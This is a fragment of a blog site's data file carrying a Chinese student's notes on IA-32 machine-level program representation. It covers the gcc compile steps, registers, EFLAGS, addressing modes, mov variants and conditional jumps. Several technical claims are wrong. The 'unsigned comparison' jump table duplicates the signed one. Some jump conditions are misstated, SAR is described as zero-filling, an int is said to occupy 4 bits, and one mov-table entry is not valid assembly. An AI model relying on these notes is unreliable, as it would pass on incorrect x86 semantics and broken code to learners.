JC DEST | CF=1 | 有进位/借位 |\n| JNC DEST | CF=0 | 无进位/借位 |\n| JE/JZ DEST | ZF=1 | 相等/等于零 |\n| JNE/JNZ DEST | ZF=0 | 不相等/不等于零 |\n| JS DEST | SF=1 | 是负数 |\n| JNS DEST | SF=0 | 是正数 |\n| JO DEST | OF=1 | 有溢出 |\n| JNO DEST | OF=0 | 无溢出 |\n| JP/JPE DEST | PF=1 | 有偶数个“1” |\n| JNP/JPO DEST | PF=0 | 有奇数个“1” |\n##### 根据两个无符号数的比较结果判断转移的指令\n| 指令 | 转移条件 | 含义 |\n| --- | --- | --- |\n| JG/JNLE DEST | SF=OF AND ZF=0 | 有符号数A>B |\n| JGE/JNL DEST | SF=OF OR ZF=1 | 有符号数A≥B |\n| JL/JNGE DEST | SF≠OF AND ZF=0 | 有符号数A<B |\n| JLE/JNG DEST | SF≠OF OR ZF=1 | 有符号数A≤B |\n##### 根据两个有符号数的比较结果判断转移的指令\n| 指令 | 转移条件 | 含义 |\n| --- | --- | --- |\n| JG/JNLE DEST | SF=OF AND ZF=0 | 有符号数A>B |\n| JGE/JNL DEST | SF=OF OR ZF=1 | 有符号数A≥B |\n| JL/JNGE DEST | SF≠OF AND ZF=0 | 有符号数A<B |\n| JLE/JNG DEST | SF≠OF OR ZF=1 | 有符号数A≤B |\n### IA-32的栈、栈帧及其结构\n![static picture](stackBP.jpg)\n##### 注：为保证其在内存中的整齐，一般的存在为16的倍数。\n\n\n#### 小结：\n本章至此也基本结束了，通过这章的学习，让我更清晰程序的内部工作原理，对优化程序也有了一定的见解。比如递归程序消耗内存，以及switch要查表才可以找到相应的选项。对汇编程序也有了一定的理解。虽然并不是那么深刻。但对以后思考代码的逻辑性以及效率性有了一定的帮助。","source":"_posts/basic-computer-sience-chapter3.md","raw":"---\ntitle: 计算机系统基础－－第三章(程序的转换及机器级表示)\ndate: 2017-05-23 16:41:08\ntags: 计算机系统基础\ndir: 计算机系统基础\nkeywords: 计算机系统基础－－第三章(程序的转换及机器级表示)\n---\n### 生成机器代码的过程\n1、预处理。：例如，在C语言中有程序以#开头的语句，在源程序中插入所有用的#include命令指定的文件和用#define申明的宏\n```\ncc -E prog1.c -o prog1.i  //对prog1.c进行预处理，预处理结果位prog1.i\n```\n2、编译。将预处理后的源程序文件编译产生相应的汇编语言程序\n```\ngcc -S prog1.i -o prog1.s或gcc -S prog1.c -o prog1.s    //对prog1.i或者prog1.c进行编译，生成汇编代码文件prog1.s\n```\n3、汇编。由汇编程序将汇编语言程序文件转换位可重定位的机器语言目标代码文件\n```\ngcc -c prog1.s -o prog1.o //对prog1.s进行汇编，生成可重定位目标文件prog1.o\n```\n3、汇编。由汇编程序将汇编语言程序文件转换位可重定位的机器语言目标代码文件\n```\ngcc prog1.o prog2.o -o prog     //将两个可重定位目标文件prog1.o prog2.o链接起来，生成可执行文件prog\n```\n### 可以使用gdb来进行调试\n在Linux中自带GNU调试工具gdb调试和跟踪。\n在生成.o文件后使用objdump -d test.o来进行反汇编查看代码\n```\n// test.c\nint add(int i,int j){\n\tint x = i+j;\n\treturn x;\n}\n// test.o\n0000000000000000 <add>:\n   0:\t55                   \tpush   %rbp\n   1:\t48 89 e5             \tmov    %rsp,%rbp\n   4:\t89 7d ec             \tmov    %edi,-0x14(%rbp)\n   7:\t89 75 e8             \tmov    %esi,-0x18(%rbp)\n   a:\t8b 55 ec             \tmov    -0x14(%rbp),%edx\n   d:\t8b 45 e8             \tmov    -0x18(%rbp),%eax\n  10:\t01 d0                \tadd    %edx,%eax\n  12:\t89 45 fc             \tmov    %eax,-0x4(%rbp)\n  15:\t8b 45 fc             \tmov    -0x4(%rbp),%eax\n  18:\t5d                   \tpop    %rbp\n  19:\tc3                   \tretq\n```\nMASM采用的是Intel格式的汇编代码\n```\t\nMOV [BX+DI-6],CL   //其对大小写不明感，且目的操作数在做，而源操作数在右\n```\nAT&T方式(教材使用方式)\n```\nmov %ecx,(%ebx,%edi,-6)  // R[ecx] <- R[ebx]+M[R[edi]-6]\n```\n寄存器组织和寻址方式\n\n通用寄存器（General Pupose Regesters，32位，8个）\n\n段寄存器（Segment Registers，16位，6个）\n\n程序状态与控制寄存器（Program Status and Control Register，32位，1个）\n\n指令指针寄存器（Instruction Pointer，32位，1个）\n#### 1.通用寄存器\nEAX：累加器（Accumulator，针对操作数和结果数据的）\n\nEBX：基址寄存器（Base，DS段中的数据指针）\n\nECX：计数器（Count，字符串和循环操作的）\n\nEDX：数据寄存器（Data，I/O指针）\n\n以上4个寄存器主要用在算术运算指令中，常常用来保存常量与变量的值。\n\nEBP：扩展基质指针寄存器（Base Pointer，SS段中栈内数据指针）\n\nESI：源变址寄存器（Source Index，字符串操作源指针）\n\nEDI：目的变址寄存器（Destination Index，字符串操作目标指针）\n\nESP：栈指针寄存器（Stack Pointer，SS段中栈指针）\n\n以上4个寄存器主要用作保存内存地址的指针。\n#### 2.段寄存器\nCS：代码段寄存器（Code Segment）\n\nSS：栈段寄存器（Stack Segment）\n\nDS：数据段寄存器（Data Segment）\n\nES：附加数据段寄存器（Extra Data Segment）\n\nFS：数据段寄存器（Data Segment）\n\nGS：数据段寄存器（Data Segment）\n\nCS寄存器用于存放应用程序代码所在段的段基址，SS寄存器用于存放栈段的段基址，DS寄存器用于存放数据段的段基址。ES、FS、GS寄存器用来存放程序使用的附加数据段的段基址。\n\n![purposeRegiesters](purposeRegisters.jpg)\n![sliceRegiester](sliceRegister.jpg)\n\n\n#### 3.程序状态与控制寄存器\nEFLAGS：Flag Register，标志寄存器\n![标志寄存器](flagRegister.gif)\n![eflag](eflagRegister.png)\n##### 运算结果标志位\n\n1、进位标志CF(Carry Flag)\n进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。\n使用该标志位的情况有：多字(字节)数的加减运算，无符号数的大小比较运算，移位操作，字(字节)之间移位，专门改变CF值的指令等。\n2、奇偶标志PF(Parity Flag)\n奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。\n利用PF可进行奇偶校验检查，或产生奇偶校验位。在数据传送过程中，为了提供传送的可靠性，如果采用奇偶校验的方法，就可使用该标志位。\n3、辅助进位标志AF(Auxiliary Carry Flag)\n在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：\n(1)、在字操作时，发生低字节向高字节进位或借位时；\n(2)、在字节操作时，发生低4位向高4位进位或借位时。\n对以上6个运算结果标志位，在一般编程情况下，标志位CF、ZF、SF和OF的使用频率较高，而标志位PF和AF的使用频率较低。\n4、零标志ZF(Zero Flag)\n零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。\n5、符号标志SF(Sign Flag)\n符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用补码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。\n6、溢出标志OF(Overflow Flag)\n溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。\n“溢出”和“进位”是两个不同含义的概念，不要混淆。\n\n##### 状态控制标志位\n\n状态控制标志位是用来控制CPU操作的，它们要通过专门的指令才能使之发生改变。\n1、追踪标志TF(Trap Flag)\n当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。\n指令系统中没有专门的指令来改变标志位TF的值，但程序员可用其它办法来改变其值。\n2、中断允许标志IF(Interrupt-enable Flag)\n中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。具体规定如下：\n(1)、当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求；\n(2)、当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。\nCPU的指令系统中也有专门的指令来改变标志位IF的值。\n3、方向标志DF(Direction Flag)\n方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。在微机的指令系统中，还提供了专门的指令来改变标志位DF的值。\n\n##### 32位标志寄存器增加的标志位\n1、I/O特权标志IOPL(I/O Privilege Level)\nI/O特权标志用两位二进制位来表示，也称为I/O特权级字段。该字段指定了要求执行I/O指令的特权级。如果当前的特权级别在数值上小于等于IOPL的值，那么，该I/O指令可执行，否则将发生一个保护异常。\n2、嵌套任务标志NT(Nested Task)\n嵌套任务标志NT用来控制中断返回指令IRET的执行。具体规定如下：\n(1)、当NT=0，用堆栈中保存的值恢复EFLAGS、CS和EIP，执行常规的中断返回操作；\n(2)、当NT=1，通过任务转换实现中断返回。\n3、重启动标志RF(Restart Flag)\n重启动标志RF用来控制是否接受调试故障。规定：RF=0时，表示“接受”调试故障，否则拒绝之。在成功执行完一条指令后，处理机把RF置为0，当接受到一个非调试故障时，处理机就把它置为1。\n4、虚拟8086方式标志VM(Virtual 8086 Mode)\n如果该标志的值为1，则表示处理机处于虚拟的8086方式下的工作状态，否则，处理机处于一般保护方式下的工作状态\n#### 4.指令指针寄存器\nEIP：指令指针寄存器（Instruction Pointer），存放下次将要执行的指令在代码段的偏移量。\n### 七种寻址方式\n![findWay](findWay.png)\n定义以下几个类型\n```\nint x;\nfloat a[100];\nshort b[4][4];\n\n```\n假设x的基址位100，每个int元素占4bit，则\na[i] = 104+i4 //比例变址\nb[i][j] = 504+i8+j*2 //基址+比例变址+位移\nx = 100 // 基址\n![](stackValue.png)\n### IA-32常用指令及其操作\n### 传送指令\n1、mov movb(比特), movw(字), movl(双字)\n2、movs 符号扩展传送指令\n3、movz 零扩展传送指令\n4、xchg 数据交换指令\n5、push 压栈\n6、pop 退栈\n7、lea 地址传送指令\n8、in,out 输入输出I/O指令\n9、pushf,popf 标志传送指令\n##### 扩展\n符号位扩展：\n八位扩展为十六位\n由 00001000 -> 1111111100001000\n零扩展：\n八位扩展为十六位\n由 00001000 -> 0000000000001000\n假设val 和ptr声明如下\n**\nval_type val;\ncontofptr_type *ptr;\n已知上述类型val_type和contofptr_type是用typeof声明的数据类型，且val存储在累加器al/ax/eax中，ptr存储在edx中，现有以下两条C语言语句：\nval= (val_type) * ptr;\n*ptr = (contofptr_type) val;\n写出以下组合类型的mov指令实现\n**\n\n| val_type | contofptr_type | \n| --- | --- |\n| char | char |\n| int | char |\n| unsigned | int |\n| int | unsigned char |\n| unsigned | unsigned char |\n| unsigned short | int |\n\n答案：\n\n|val_type        |contofptr_type|语句一对应的操作                        |       语句二对应的操作\n----------------|--------------|-------------------------             |----\n|char            | char         | movb  (%edx),%al //传送              |movb %al,(%edx)//传送|\n|int             | char         | movsb (%edx),%eax // 符号位扩展，传送  |movb %al,(%edx)  //截断，传送|\n|unsigned        | int          |movl (%edx),%eax //传送               |movl %eax,(%edx)  //传送|\n|int             | unsigned char| movzbl (%edx),%eax // 零扩展，传送     | movb %al,(%edx)   //截断，传送|\n|unsigned        | unsigned char|movzbl (%edx),%eax // 零扩展，传送      | movb %al,(%edx)   //截断，传送|\n|unsigned short  | int          |movw (%edx),%ax // 截断，传送          | movzwl %ax,(%edx)   //零扩展，传送|\n\n其在寄存器中以小端方式储存\n**即|12345678H|-> |78H|56H|34H|12H|**\n##### 按位运算指令\n1、NOT单操作数每位取反\n2、AND对双操作数按位逻辑“与”\n3、OR对双操作数按位逻辑“或”\n4、XOR对双操作数按位逻辑“异或”\n5、TEST根据两个操作数相“与”的结果来设置条件标志\n6、SHL逻辑左移，每左移一次，最高位送入cf，并在低位补0\n7、SHR逻辑右移，每右移一次，最低位送入cf，并在高位补0\n8、SAL算术左移，每左移一次，最高位送入cf，并在低位补0，若符号位发生变化，则of=1，表示左移溢出\n9、SAR算术右移，每右移一次，最低位送入cf，并在高位补0\n10、ROL循环左移，每左移一次，最高位移到最低位，并送入cf\n11、ROR循环右移，每右移一次，最低位移到最高位，并送入cf\n12、RCL带循环左移，将CF作为操作数的一部分循环左移\n13、RCR带循环右移，将CF作为操作数的一部分循环右移\n##### 控制转移指令JMP\n##### 条件转移指令\n##### 根据单个标志位的状态判断转移的指令\n| 指令 | 转移条件 | 说明 |\n| --- | --- | --- |\n| JC DEST | CF=1 | 有进位/借位 |\n| JNC DEST | CF=0 | 无进位/借位 |\n| JE/JZ DEST | ZF=1 | 相等/等于零 |\n| JNE/JNZ DEST | ZF=0 | 不相等/不等于零 |\n| JS DEST | SF=1 | 是负数 |\n| JNS DEST | SF=0 | 是正数 |\n| JO DEST | OF=1 | 有溢出 |\n| JNO DEST | OF=0 | 无溢出 |\n| JP/JPE DEST | PF=1 | 有偶数个“1” |\n| JNP/JPO DEST | PF=0 | 有奇数个“1” |\n##### 根据两个无符号数的比较结果判断转移的指令\n| 指令 | 转移条件 | 含义 |\n| --- | --- | --- |\n| JG/JNLE DEST | SF=OF AND ZF=0 | 有符号数A>B |\n| JGE/JNL DEST | SF=OF OR ZF=1 | 有符号数A≥B |\n| JL/JNGE DEST | SF≠OF AND ZF=0 | 有符号数A<B |\n| JLE/JNG DEST | SF≠OF OR ZF=1 | 有符号数A≤B |\n##### 根据两个有符号数的比较结果判断转移的指令\n| 指令 | 转移条件 | 含义 |\n| --- | --- | --- |\n| JG/JNLE DEST | SF=OF AND ZF=0 | 有符号数A>B |\n| JGE/JNL DEST | SF=OF OR ZF=1 | 有符号数A≥B |\n| JL/JNGE DEST | SF≠OF AND ZF=0 | 有符号数A<B |\n| JLE/JNG DEST | SF≠OF OR ZF=1 | 有符号数A≤B |\n### IA-32的栈、栈帧及其结构\n![static picture](stackBP.jpg)\n##### 注：为保证其在内存中的整齐，一般的存在为16的倍数。\n\n\n#### 小结：\n本章至此也基本结束了，通过这章的学习，让我更清晰程序的内部工作原理，对优化程序也有了一定的见解。比如递归程序消耗内存，以及switch要查表才可以找到相应的选项。对汇编程序也有了一定的理解。虽然并不是那么深刻。但对以后思考代码的逻辑性以及效率性有了一定的帮助。","slug":"basic-computer-sience-chapter3","published":1,"updated":"2021-09-11T05:44:26.930Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nyzw00054jzxwv5kmynd","content":"<h3 id=\"生成机器代码的过程\"><a href=\"#生成机器代码的过程\" class=\"headerlink\" title=\"生成机器代码的过程\"></a>生成机器代码的过程</h3><p>1、预处理。：例如，在C语言中有程序以#开头的语句，在源程序中插入所有用的#include命令指定的文件和用#define申明的宏<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cc -E prog1.c -o prog1.i  //对prog1.c进行预处理，预处理结果位prog1.i</span><br></pre></td></tr></table></figure><p></p><p>2、编译。将预处理后的源程序文件编译产生相应的汇编语言程序<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -S prog1.i -o prog1.s或gcc -S prog1.c -o prog1.s    //对prog1.i或者prog1.c进行编译，生成汇编代码文件prog1.s</span><br></pre></td></tr></table></figure><p></p><p>3、汇编。由汇编程序将汇编语言程序文件转换位可重定位的机器语言目标代码文件<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c prog1.s -o prog1.o //对prog1.s进行汇编，生成可重定位目标文件prog1.o</span><br></pre></td></tr></table></figure><p></p><p>3、汇编。由汇编程序将汇编语言程序文件转换位可重定位的机器语言目标代码文件<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc prog1.o prog2.o -o prog     //将两个可重定位目标文件prog1.o prog2.o链接起来，生成可执行文件prog</span><br></pre></td></tr></table></figure><p></p><h3 id=\"可以使用gdb来进行调试\"><a href=\"#可以使用gdb来进行调试\" class=\"headerlink\" title=\"可以使用gdb来进行调试\"></a>可以使用gdb来进行调试</h3><p>在Linux中自带GNU调试工具gdb调试和跟踪。<br>在生成.o文件后使用objdump -d test.o来进行反汇编查看代码<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// test.c</span><br><span class=\"line\">int add(int i,int j)&#123;</span><br><span class=\"line\">\tint x = i+j;</span><br><span class=\"line\">\treturn x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// test.o</span><br><span class=\"line\">0000000000000000 &lt;add&gt;:</span><br><span class=\"line\">   0:\t55                   \tpush   %rbp</span><br><span class=\"line\">   1:\t48 89 e5             \tmov    %rsp,%rbp</span><br><span class=\"line\">   4:\t89 7d ec             \tmov    %edi,-0x14(%rbp)</span><br><span class=\"line\">   7:\t89 75 e8             \tmov    %esi,-0x18(%rbp)</span><br><span class=\"line\">   a:\t8b 55 ec             \tmov    -0x14(%rbp),%edx</span><br><span class=\"line\">   d:\t8b 45 e8             \tmov    -0x18(%rbp),%eax</span><br><span class=\"line\">  10:\t01 d0                \tadd    %edx,%eax</span><br><span class=\"line\">  12:\t89 45 fc             \tmov    %eax,-0x4(%rbp)</span><br><span class=\"line\">  15:\t8b 45 fc             \tmov    -0x4(%rbp),%eax</span><br><span class=\"line\">  18:\t5d                   \tpop    %rbp</span><br><span class=\"line\">  19:\tc3                   \tretq</span><br></pre></td></tr></table></figure><p></p><p>MASM采用的是Intel格式的汇编代码<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV [BX+DI-6],CL   //其对大小写不明感，且目的操作数在做，而源操作数在右</span><br></pre></td></tr></table></figure><p></p><p>AT&amp;T方式(教材使用方式)<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov %ecx,(%ebx,%edi,-6)  // R[ecx] &lt;- R[ebx]+M[R[edi]-6]</span><br></pre></td></tr></table></figure><p></p><p>寄存器组织和寻址方式</p><p>通用寄存器（General Pupose Regesters，32位，8个）</p><p>段寄存器（Segment Registers，16位，6个）</p><p>程序状态与控制寄存器（Program Status and Control Register，32位，1个）</p><p>指令指针寄存器（Instruction Pointer，32位，1个）</p><h4 id=\"1-通用寄存器\"><a href=\"#1-通用寄存器\" class=\"headerlink\" title=\"1.通用寄存器\"></a>1.通用寄存器</h4><p>EAX：累加器（Accumulator，针对操作数和结果数据的）</p><p>EBX：基址寄存器（Base，DS段中的数据指针）</p><p>ECX：计数器（Count，字符串和循环操作的）</p><p>EDX：数据寄存器（Data，I/O指针）</p><p>以上4个寄存器主要用在算术运算指令中，常常用来保存常量与变量的值。</p><p>EBP：扩展基质指针寄存器（Base Pointer，SS段中栈内数据指针）</p><p>ESI：源变址寄存器（Source Index，字符串操作源指针）</p><p>EDI：目的变址寄存器（Destination Index，字符串操作目标指针）</p><p>ESP：栈指针寄存器（Stack Pointer，SS段中栈指针）</p><p>以上4个寄存器主要用作保存内存地址的指针。</p><h4 id=\"2-段寄存器\"><a href=\"#2-段寄存器\" class=\"headerlink\" title=\"2.段寄存器\"></a>2.段寄存器</h4><p>CS：代码段寄存器（Code Segment）</p><p>SS：栈段寄存器（Stack Segment）</p><p>DS：数据段寄存器（Data Segment）</p><p>ES：附加数据段寄存器（Extra Data Segment）</p><p>FS：数据段寄存器（Data Segment）</p><p>GS：数据段寄存器（Data Segment）</p><p>CS寄存器用于存放应用程序代码所在段的段基址，SS寄存器用于存放栈段的段基址，DS寄存器用于存放数据段的段基址。ES、FS、GS寄存器用来存放程序使用的附加数据段的段基址。</p><p><img src=\"/img/loading.gif\" data-original=\"/计算机系统基础/basic-computer-sience-chapter3/purposeRegisters.jpg\" alt=\"purposeRegiesters\"><br><img src=\"/img/loading.gif\" data-original=\"/计算机系统基础/basic-computer-sience-chapter3/sliceRegister.jpg\" alt=\"sliceRegiester\"></p><h4 id=\"3-程序状态与控制寄存器\"><a href=\"#3-程序状态与控制寄存器\" class=\"headerlink\" title=\"3.程序状态与控制寄存器\"></a>3.程序状态与控制寄存器</h4><p>EFLAGS：Flag Register，标志寄存器<br><img src=\"/img/loading.gif\" data-original=\"/计算机系统基础/basic-computer-sience-chapter3/flagRegister.gif\" alt=\"标志寄存器\"><br><img src=\"/img/loading.gif\" data-original=\"/计算机系统基础/basic-computer-sience-chapter3/eflagRegister.png\" alt=\"eflag\"></p><h5 id=\"运算结果标志位\"><a href=\"#运算结果标志位\" class=\"headerlink\" title=\"运算结果标志位\"></a>运算结果标志位</h5><p>1、进位标志CF(Carry Flag)<br>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。<br>使用该标志位的情况有：多字(字节)数的加减运算，无符号数的大小比较运算，移位操作，字(字节)之间移位，专门改变CF值的指令等。<br>2、奇偶标志PF(Parity Flag)<br>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。<br>利用PF可进行奇偶校验检查，或产生奇偶校验位。在数据传送过程中，为了提供传送的可靠性，如果采用奇偶校验的方法，就可使用该标志位。<br>3、辅助进位标志AF(Auxiliary Carry Flag)<br>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：<br>(1)、在字操作时，发生低字节向高字节进位或借位时；<br>(2)、在字节操作时，发生低4位向高4位进位或借位时。<br>对以上6个运算结果标志位，在一般编程情况下，标志位CF、ZF、SF和OF的使用频率较高，而标志位PF和AF的使用频率较低。<br>4、零标志ZF(Zero Flag)<br>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br>5、符号标志SF(Sign Flag)<br>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用补码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。<br>6、溢出标志OF(Overflow Flag)<br>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。<br>“溢出”和“进位”是两个不同含义的概念，不要混淆。</p><h5 id=\"状态控制标志位\"><a href=\"#状态控制标志位\" class=\"headerlink\" title=\"状态控制标志位\"></a>状态控制标志位</h5><p>状态控制标志位是用来控制CPU操作的，它们要通过专门的指令才能使之发生改变。<br>1、追踪标志TF(Trap Flag)<br>当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。<br>指令系统中没有专门的指令来改变标志位TF的值，但程序员可用其它办法来改变其值。<br>2、中断允许标志IF(Interrupt-enable Flag)<br>中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。具体规定如下：<br>(1)、当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求；<br>(2)、当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。<br>CPU的指令系统中也有专门的指令来改变标志位IF的值。<br>3、方向标志DF(Direction Flag)<br>方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。在微机的指令系统中，还提供了专门的指令来改变标志位DF的值。</p><h5 id=\"32位标志寄存器增加的标志位\"><a href=\"#32位标志寄存器增加的标志位\" class=\"headerlink\" title=\"32位标志寄存器增加的标志位\"></a>32位标志寄存器增加的标志位</h5><p>1、I/O特权标志IOPL(I/O Privilege Level)<br>I/O特权标志用两位二进制位来表示，也称为I/O特权级字段。该字段指定了要求执行I/O指令的特权级。如果当前的特权级别在数值上小于等于IOPL的值，那么，该I/O指令可执行，否则将发生一个保护异常。<br>2、嵌套任务标志NT(Nested Task)<br>嵌套任务标志NT用来控制中断返回指令IRET的执行。具体规定如下：<br>(1)、当NT=0，用堆栈中保存的值恢复EFLAGS、CS和EIP，执行常规的中断返回操作；<br>(2)、当NT=1，通过任务转换实现中断返回。<br>3、重启动标志RF(Restart Flag)<br>重启动标志RF用来控制是否接受调试故障。规定：RF=0时，表示“接受”调试故障，否则拒绝之。在成功执行完一条指令后，处理机把RF置为0，当接受到一个非调试故障时，处理机就把它置为1。<br>4、虚拟8086方式标志VM(Virtual 8086 Mode)<br>如果该标志的值为1，则表示处理机处于虚拟的8086方式下的工作状态，否则，处理机处于一般保护方式下的工作状态</p><h4 id=\"4-指令指针寄存器\"><a href=\"#4-指令指针寄存器\" class=\"headerlink\" title=\"4.指令指针寄存器\"></a>4.指令指针寄存器</h4><p>EIP：指令指针寄存器（Instruction Pointer），存放下次将要执行的指令在代码段的偏移量。</p><h3 id=\"七种寻址方式\"><a href=\"#七种寻址方式\" class=\"headerlink\" title=\"七种寻址方式\"></a>七种寻址方式</h3><p><img src=\"/img/loading.gif\" data-original=\"/计算机系统基础/basic-computer-sience-chapter3/findWay.png\" alt=\"findWay\"><br>定义以下几个类型<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int x;</span><br><span class=\"line\">float a[100];</span><br><span class=\"line\">short b[4][4];</span><br></pre></td></tr></table></figure><p></p><p>假设x的基址位100，每个int元素占4bit，则<br>a[i] = 104+i4 //比例变址<br>b[i][j] = 504+i8+j*2 //基址+比例变址+位移<br>x = 100 // 基址<br><img src=\"/img/loading.gif\" data-original=\"/计算机系统基础/basic-computer-sience-chapter3/stackValue.png\" alt></p><h3 id=\"IA-32常用指令及其操作\"><a href=\"#IA-32常用指令及其操作\" class=\"headerlink\" title=\"IA-32常用指令及其操作\"></a>IA-32常用指令及其操作</h3><h3 id=\"传送指令\"><a href=\"#传送指令\" class=\"headerlink\" title=\"传送指令\"></a>传送指令</h3><p>1、mov movb(比特), movw(字), movl(双字)<br>2、movs 符号扩展传送指令<br>3、movz 零扩展传送指令<br>4、xchg 数据交换指令<br>5、push 压栈<br>6、pop 退栈<br>7、lea 地址传送指令<br>8、in,out 输入输出I/O指令<br>9、pushf,popf 标志传送指令</p><h5 id=\"扩展\"><a href=\"#扩展\" class=\"headerlink\" title=\"扩展\"></a>扩展</h5><p>符号位扩展：<br>八位扩展为十六位<br>由 00001000 -&gt; 1111111100001000<br>零扩展：<br>八位扩展为十六位<br>由 00001000 -&gt; 0000000000001000<br>假设val 和ptr声明如下<br><strong><br>val_type val;<br>contofptr_type <em>ptr;<br>已知上述类型val_type和contofptr_type是用typeof声明的数据类型，且val存储在累加器al/ax/eax中，ptr存储在edx中，现有以下两条C语言语句：<br>val= (val_type) </em>ptr;<br>*ptr = (contofptr_type) val;<br>写出以下组合类型的mov指令实现</strong></p><table><thead><tr><th>val_type</th><th>contofptr_type</th></tr></thead><tbody><tr><td>char</td><td>char</td></tr><tr><td>int</td><td>char</td></tr><tr><td>unsigned</td><td>int</td></tr><tr><td>int</td><td>unsigned char</td></tr><tr><td>unsigned</td><td>unsigned char</td></tr><tr><td>unsigned short</td><td>int</td></tr></tbody></table><p>答案：</p><table><thead><tr><th></th><th>val_type</th><th>contofptr_type</th><th>语句一对应的操作</th><th>语句二对应的操作</th></tr></thead><tbody><tr><td></td><td>char</td><td>char</td><td>movb (%edx),%al //传送</td><td>movb %al,(%edx)//传送</td><td></td></tr><tr><td></td><td>int</td><td>char</td><td>movsb (%edx),%eax // 符号位扩展，传送</td><td>movb %al,(%edx) //截断，传送</td><td></td></tr><tr><td></td><td>unsigned</td><td>int</td><td>movl (%edx),%eax //传送</td><td>movl %eax,(%edx) //传送</td><td></td></tr><tr><td></td><td>int</td><td>unsigned char</td><td>movzbl (%edx),%eax // 零扩展，传送</td><td>movb %al,(%edx) //截断，传送</td><td></td></tr><tr><td></td><td>unsigned</td><td>unsigned char</td><td>movzbl (%edx),%eax // 零扩展，传送</td><td>movb %al,(%edx) //截断，传送</td><td></td></tr><tr><td></td><td>unsigned short</td><td>int</td><td>movw (%edx),%ax // 截断，传送</td><td>movzwl %ax,(%edx) //零扩展，传送</td><td></td></tr></tbody></table><p>其在寄存器中以小端方式储存<br><strong>即|12345678H|-&gt; |78H|56H|34H|12H|</strong></p><h5 id=\"按位运算指令\"><a href=\"#按位运算指令\" class=\"headerlink\" 